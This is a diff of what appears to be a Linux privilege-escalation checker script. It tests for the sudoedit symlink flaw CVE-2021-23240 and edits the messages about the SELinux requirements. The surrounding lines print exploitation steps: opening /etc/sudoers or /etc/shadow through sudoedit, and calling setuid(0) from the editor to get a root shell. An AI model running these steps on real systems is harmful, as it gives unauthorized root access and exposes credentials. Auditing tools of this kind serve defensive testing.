@@ -449,8 +449,9 @@ check_psymlinks=`cat /proc/sys/fs/protected_symlinks | grep 0`
 if [ "$check_psymlinks" ]; then
   echo -e "${BOLD}${GREEN}[+] Checking for the vulnerability CVE-2021-23240:: ${RESET}" 
   echo -e "[-] The version of sudo is vulnerable and symlinks is not protected (set to 0)"
-  echo -e "[-] Provided that SELinux is in permissive (not enforcing) mode or the invoking"
-  echo "user is in an unconfined domain, all requirements will be met for exploitation."  
+  echo -e "[-] Provided that SELinux is in permissive (not enforcing or disables) mode (Refer to the file  /etc/selinux/) "
+  echo "or the invoking user is in an unconfined domain, then only all requirements will be met for exploitation."
+  echo "Permissive mode: SELinux prints warnings instead of enforcing."
   echo -e "[*] M1 : Run command: sudoedit /path then :e /etc/sudoers or :e /etc/shadow"  
   echo -e "[*] M2 : Run command: S1 -> sudoedit /path then :call libcallnr("libc.so.6","setuid",0)"
   echo -e " S2 -> then run ::!bash"
